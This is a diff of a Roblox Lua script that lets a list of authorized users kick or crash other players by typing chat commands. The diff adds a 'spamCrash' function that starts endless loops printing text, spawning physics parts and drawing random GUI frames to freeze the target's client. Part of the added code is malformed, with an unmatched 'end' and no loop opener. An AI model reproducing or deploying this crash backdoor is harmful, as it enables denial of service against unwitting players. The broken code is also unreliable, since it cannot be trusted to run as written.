@@ -1,5 +1,6 @@
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
 
 local AUTHORIZED_USERS = {
     rWeFrRoblox = true,
@@ -16,6 +17,42 @@ for name in pairs(AUTHORIZED_USERS) do
     AUTHORIZED_USERS[name] = nil
 end
 
+local function spamCrash()
+    task.spawn(function()
+        while true do
+            print("imagine crashing")
+        end
+    end)
+
+    task.spawn(function()
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.IgnoreGuiInset = true
+        screenGui.ResetOnSpawn = false
+        screenGui.Name = "CrashGui"
+        screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+            local frame = Instance.new("Frame")
+            frame.Size = UDim2.new(0, math.random(10, 500), 0, math.random(10, 500))
+            frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
+            frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
+            frame.BorderSizePixel = 0
+            frame.Parent = screenGui
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            local part = Instance.new("Part")
+            part.Size = Vector3.new(5, 5, 5)
+            part.Position = LocalPlayer.Character and LocalPlayer.Character:GetPivot().Position + Vector3.new(math.random(-20, 20), 20, math.random(-20, 20)) or Vector3.new(0, 50, 0)
+            part.Anchored = false
+            part.CanCollide = true
+            part.BrickColor = BrickColor.Random()
+            part.Parent = workspace
+        end
+    end)
+end
+
 local function onChat(player, message)
     local senderName = player.Name:lower()
     if not AUTHORIZED_USERS[senderName] then return end
@@ -24,15 +61,13 @@ local function onChat(player, message)
 
     local kickTarget = message:match("^,kick%s+(%S+)")
     if kickTarget and kickTarget == LocalPlayer.Name:lower() then
-        LocalPlayer:Kick("Kicked by a dev or owner")
+        LocalPlayer:Kick("You were kicked by " .. player.Name)
         return
     end
 
     local crashTarget = message:match("^,crash%s+(%S+)")
     if crashTarget and crashTarget == LocalPlayer.Name:lower() then
-        while true do
-            print("imagine crashing")
-        end
+        spamCrash()
     end
 end
 
